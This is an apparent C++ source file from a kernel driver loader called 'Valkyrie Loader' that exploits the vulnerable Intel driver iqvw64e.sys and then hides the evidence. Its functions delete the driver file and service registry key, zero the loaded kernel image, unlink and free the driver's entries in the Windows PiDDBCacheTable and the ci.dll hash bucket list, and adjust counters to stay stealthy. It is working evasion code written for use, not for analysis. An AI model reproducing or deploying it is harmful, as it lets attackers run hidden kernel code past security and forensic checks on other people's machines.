#include "StealthKit.hpp"
#include <algorithm>
#include "Win.hpp"



BOOLEAN StealthKit::DeleteDriverFiles(const std::wstring& serviceName)
{
    wchar_t path[MAX_PATH];
    if (!GetSystemDirectoryW(path, MAX_PATH)) return false;

    std::wstring driverPath = std::wstring(path) + L"\\drivers\\" + serviceName + L".sys";

    if (!MoveFileExW(driverPath.c_str(), nullptr, MOVEFILE_DELAY_UNTIL_REBOOT)) 
    {
        std::wcout << L"[!] MoveFileEx failed " << GetLastError() << L'\n';
        return false;
    }

    std::wcout << L"[+] Driver file queued for delete on reboot\n";
    return true;
}

BOOLEAN StealthKit::EraseServiceKey(const std::wstring& serviceName)
{
    const std::wstring keyPath = L"SYSTEM\\CurrentControlSet\\Services\\" + serviceName;

    LSTATUS st = RegDeleteTreeW(HKEY_LOCAL_MACHINE, keyPath.c_str());
    if (st != ERROR_SUCCESS && st != ERROR_FILE_NOT_FOUND)
    {
        std::wcout << L"[!] RegDeleteTree failed " << st << L'\n';
        return false;
    }

    std::wcout << L"[+] Service registry key erased\n";
    return true;
}


BOOLEAN StealthKit::WipeKernelImage(uint64_t base, uint32_t size)
{
    if (!base || !size) return false;

    std::vector<uint8_t> zeros((size + 0xFFF) & ~0xFFF, 0);

    m_loader.WriteMemory(base, zeros.data(), static_cast<ULONG>(zeros.size()));
    std::wcout << L"[+] Kernel image wiped (0x" << std::hex << size << L" bytes)\n";

    return TRUE;
}



// Full of sketchy cast because of the way we read/write kernel memory remotely...
ValkStatus StealthKit::CleanPiDDBCache(const std::wstring& driverName, ULONG timeStamp)
{
    if (!m_loader.GetNtoskrnlBaseAddress())
    {
        LOG_ERROR("Error cannot get ntoskrnl base address");
        return ValkStatus::ERR_KERNEL_ADDRESS_NOT_FOUND;
    }

    PVOID lock = m_loader.GetPiDDBLock();
    if (!lock)
    {
        LOG_ERROR("PiDDBLock not found");
        return ValkStatus::ERR_NOT_FOUND;
    }

    PRTL_AVL_TABLE table = m_loader.GetPiDDBCacheTable();
    if (!table)
    {
        LOG_ERROR("PiDDBCacheTable not found");
        return ValkStatus::ERR_NOT_FOUND;
    }

    if (!m_loader.ExAcquireResourceExclusiveLite(lock, TRUE)) 
    {
        LOG_ERROR("Can't acquire PiDDBLock");
        return ValkStatus::ERR_READ_FAILED;
    }

    PiDDBCacheEntry* entry = m_loader.LookupEntry(table, timeStamp, driverName.c_str());
    if (!entry)
    {
        LOG_ERROR("Driver not found in PiDDBCacheTable");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_NOT_FOUND;
    }

    // Unlink
    PLIST_ENTRY blink = nullptr;
    PLIST_ENTRY flink = nullptr;

    // Read Blink & Flink
    if (!m_loader.ReadMemory((uint64_t)&entry->List.Blink, &blink, sizeof(blink)) ||
        !m_loader.ReadMemory((uint64_t)&entry->List.Flink, &flink, sizeof(flink)))
    {
        LOG_ERROR("Failed to read LIST_ENTRY pointers");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_ACCESS_DENIED;
    }

    // Reconnect prev->Flink = entry->Flink or we gonna have a bad day...
    if (!m_loader.WriteMemory((uint64_t) & ((PLIST_ENTRY)blink)->Flink, &flink, sizeof(flink)))
    {
        LOG_ERROR("Failed to update Flink");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_ACCESS_DENIED;
    }

	// Same as above... blink->Blink = entry->Blink
    if (!m_loader.WriteMemory((uint64_t) & ((PLIST_ENTRY)flink)->Blink, &blink, sizeof(blink)))
    {
        LOG_ERROR("Failed to update Blink");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_ACCESS_DENIED;
    }


	// Delete entry from AVL table
    if (!m_loader.RtlDeleteElementGenericTableAvl(table, entry)) 
    {
        LOG_ERROR("RtlDeleteElementGenericTableAvl failed");
        m_loader.ExReleaseResourceLite(lock);
        return ValkStatus::ERR_NOT_FOUND;
    }

    
    

	// Decrement DeleteCount, just to be tidy, even if not strictly necessary... But why not? It's more stealthy.
    ULONG deleteCount = 0;
    if (m_loader.ReadMemory((uint64_t)&table->DeleteCount, &deleteCount, sizeof(deleteCount))) 
    {
        if (deleteCount > 0) 
        {
            deleteCount--;
            m_loader.WriteMemory((uint64_t)&table->DeleteCount, &deleteCount, sizeof(deleteCount));
        }
    }

    m_loader.ExReleaseResourceLite(lock);
    LOG_SUCCESS("PiDDBCacheTable cleaned");
    return ValkStatus::OK;
}

void StealthKit::EnumeratePiDDBCache()
{
    PRTL_AVL_TABLE table = m_loader.GetPiDDBCacheTable();
    if (!table)
    {
        LOG_ERROR("PiDDBCacheTable not found");
        return;
    }

    LOG_SUCCESS(L"Enumerating PiDDBCache...");

    ULONG numberOfElements = 0;
    if (m_loader.ReadMemory((uint64_t)&table->NumberGenericTableElements,
        &numberOfElements, sizeof(numberOfElements)))
    {
        LOG_SUCCESS(L"Total elements in table: " << numberOfElements);
    }


    PVOID restartKey = nullptr;
    bool found = false;

    for (SIZE_T i = 0; i < numberOfElements; i++)
    {
        PVOID element = m_loader.RtlEnumerateGenericTableWithoutSplayingAvl(table, &restartKey);
        if (!element)
            break;

        PiDDBCacheEntry entry = { 0 };
        if (!m_loader.ReadMemory((uint64_t)element, &entry, sizeof(entry)))
        {
            LOG_ERROR(L"Failed to read entry at index " << i);
            break;
        }

        std::wstring driverNameStr = L"<unknown>";
        if (entry.DriverName.Buffer && entry.DriverName.Length > 0)
        {
            std::vector<wchar_t> buffer(256, 0);
            SIZE_T bytesToRead = entry.DriverName.Length;
            if (bytesToRead > (buffer.size() - 1) * sizeof(wchar_t))
                bytesToRead = (buffer.size() - 1) * sizeof(wchar_t);

            if (m_loader.ReadMemory((uint64_t)entry.DriverName.Buffer,
                buffer.data(),
                bytesToRead))
            {
                driverNameStr = buffer.data();
            }
        }

        auto savedFlags = std::wcout.flags();
        std::wcout << L"[Valkyrie Loader] [+]   [" << std::dec << i << L"] Driver: "
            << driverNameStr
            << L", Timestamp: 0x" << std::hex << entry.TimeDateStamp << L'\n' << std::flush;
        std::wcout.flags(savedFlags);


        if (driverNameStr == L"iqvw64e.sys")
        {
            LOG_SUCCESS(L"Found iqvw64e.sys in PiDDBCache");
            found = true;
        }
    }

    if (!found)
    {
        LOG_SUCCESS(L"iqvw64e.sys not found in PiDDBCache, that's good news.");
    }

    LOG_SUCCESS("End of enumeration.");
}


// -----------------------------------------------------------------------
// WARNING: UGLY NESTED IFS AHEAD!
// 
// This looks messy, but each check is CRITICAL for kernel memory safety.
// We're reading RAW kernel addresses remotely here, any mistake = instant BSOD.
//
// Yes, it's ugly. No, we won't use fancy C++20 features here because:
// 1. We need explicit error handling for each operations. No pyramid of DOOM. FAIL FAST ABSOLUTLY NEEDED.
// 2. Kernel debugging is hard enough without abstraction layers.
// 3. Reliability > Code beauty in this context.
// 4. I'm lazy and don't want to refactor this right now :)) but that's another story lmao...
// 
// If you mess with it, use a VM & Windbg ready to catch the BSODs :))
// -----------------------------------------------------------------------
ValkStatus StealthKit::ClearCIHashTable()
{
    constexpr ULONG MAX_NAME_LEN = 256;

    UINT64 ciBase = PEUtils::GetModuleBaseAddress("ci.dll");
    if (!ciBase)
        return ValkStatus::ERR_MODULE_NOT_FOUND;

    auto sig = m_loader.FindPatternInSectionAtKernel("PAGE", ciBase,
        PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"),
        "xxx????x?xxxxxxx");
    if (!sig)
        return ValkStatus::ERR_PATTERN_NOT_FOUND;

    auto sig2 = m_loader.FindPatternAtKernel((uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), "xxx");
    if (!sig2)
        return ValkStatus::ERR_PATTERN_NOT_FOUND;

    const auto g_BucketList = m_loader.ResolveRelativeAddress((PVOID)sig, 3, 7);
    const auto g_Lock = m_loader.ResolveRelativeAddress((PVOID)sig2, 3, 7);
    if (!g_BucketList || !g_Lock)
        return ValkStatus::ERR_RESOLVE_FAILED;

    LOG_SUCCESS_HEX("BucketList", g_BucketList);
    LOG_SUCCESS_HEX("Lock", g_Lock);

    if (!m_loader.ExAcquireResourceExclusiveLite(g_Lock, true))
        return ValkStatus::ERR_LOCK_FAILED;

	// Might need to get fixed later since we gonna also randomize driver path.
    const std::wstring targetName = m_loader.GetDriverName();  // "iqvw64e.sys"
    const std::wstring targetPath = m_loader.GetDriverPath();  // "C:\Users\...\Temp\iqvw64e.sys"

    const size_t targetBytes = (targetPath.length() - 2) * sizeof(wchar_t);

    LOG_SUCCESS(L"Target name: " + targetName);
    LOG_SUCCESS(L"Target path: " + targetPath);
    LOG_SUCCESS_HEX("Target bytes", targetBytes);

    uintptr_t prev = (uintptr_t)g_BucketList;
    uintptr_t curr = 0;

    if (!m_loader.ReadMemory(prev, &curr, sizeof(curr)))
    {
        LOG_ERROR("Failed to read first entry");
        m_loader.ExReleaseResourceLite(g_Lock);
        return ValkStatus::ERR_READ_FAILED;
    }

    LOG_SUCCESS_HEX("First entry", curr);

    if (!curr)
    {
        LOG_SUCCESS("BucketList empty – nothing to clean");
        m_loader.ExReleaseResourceLite(g_Lock);
        return ValkStatus::OK;
    }

    while (curr)
    {
        LOG_SUCCESS_HEX("[CI] scanning entry", curr);

        USHORT len = 0;
        if (!m_loader.ReadMemory(curr + offsetof(HashBucketEntry, DriverName.Length), &len, sizeof(len)))
        {
            LOG_ERROR("failed to read Length");
            break;
        }
        LOG_SUCCESS_HEX("Length", len);

        uintptr_t bufferAddr = 0;
        if (!m_loader.ReadMemory(curr + offsetof(HashBucketEntry, DriverName.Buffer), &bufferAddr, sizeof(bufferAddr)))
        {
            LOG_ERROR("failed to read Buffer address");
            break;
        }


        if (bufferAddr && bufferAddr != (uintptr_t)nullptr && len > 0 && len <= MAX_NAME_LEN * sizeof(wchar_t))
        {
            size_t charCount = len / sizeof(wchar_t);
            auto name = std::make_unique<wchar_t[]>(charCount + 1);

            if (m_loader.ReadMemory(bufferAddr, name.get(), len))
            {
                name[charCount] = L'\0';
                std::wstring_view sv(name.get(), charCount);

                LOG_SUCCESS(L"name: " + std::wstring(sv));

                if (len == targetBytes)
                {
                    LOG_SUCCESS(">>> LENGTH MATCH!");

                    if (sv.find(targetName) != std::wstring_view::npos)
                    {
                        LOG_SUCCESS(">>> EXACT MATCH !");

                        uintptr_t next = 0;
                        if (!m_loader.ReadMemory(curr, &next, sizeof(next)))
                        {
                            LOG_ERROR("failed to read Next");
                            break;
                        }
                        LOG_SUCCESS_HEX("Next entry", next);

                        if (!m_loader.WriteMemory(prev, &next, sizeof(next)))
                        {
                            LOG_ERROR("failed to unlink");
                            break;
                        }

                        if (!m_loader.ExFreePool(curr))
                        {
                            LOG_ERROR("ExFreePool failed");
                            break;
                        }

                        LOG_SUCCESS("entry unlinked + freed");
                        m_loader.ExReleaseResourceLite(g_Lock);
                        return ValkStatus::OK;
                    }
                    else
                    {
                        LOG_SUCCESS("Length matches but name doesn't");
                    }
                }
            }
            else
            {
                LOG_ERROR("failed to read driver name");
            }
        }

        else
        {
            if (!bufferAddr) 
            {
                LOG_ERROR("Buffer address is NULL");
            }
            else if (len == 0)
            {
                LOG_ERROR("Length is zero");
            }
        }

        prev = curr;
        if (!m_loader.ReadMemory(curr, &curr, sizeof(curr)))
        {
            LOG_ERROR("failed to read Next pointer");
            break;
        }
    }

    LOG_SUCCESS("No more entries – driver not found in CI list");
    m_loader.ExReleaseResourceLite(g_Lock);
    return ValkStatus::ERR_NOT_FOUND;
}

    